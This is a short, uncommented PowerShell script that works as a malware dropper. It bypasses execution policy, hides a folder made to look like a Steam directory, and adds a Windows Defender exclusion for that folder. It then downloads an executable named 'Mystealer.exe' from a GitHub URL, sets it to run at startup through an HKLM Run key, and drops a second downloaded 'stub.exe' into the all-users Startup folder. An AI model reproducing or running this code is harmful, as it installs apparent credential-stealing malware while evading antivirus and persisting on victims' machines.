Set-ExecutionPolicy Bypass -Scope Process -Force
$rdir = "$env:SystemDrive\ProgramData\Steam"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir

$url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/haha.exe"
$output = "$dir\Mystealer.exe"
Invoke-WebRequest -Uri $url -OutFile $output
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
$appName = "StartupUmbreal"
Set-ItemProperty -Path $regPath -Name $appName -Value "`"$output`""

$url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
$output = "$startupfolder\Updateclientt.exe"
Invoke-WebRequest -Uri $url -OutFile $output
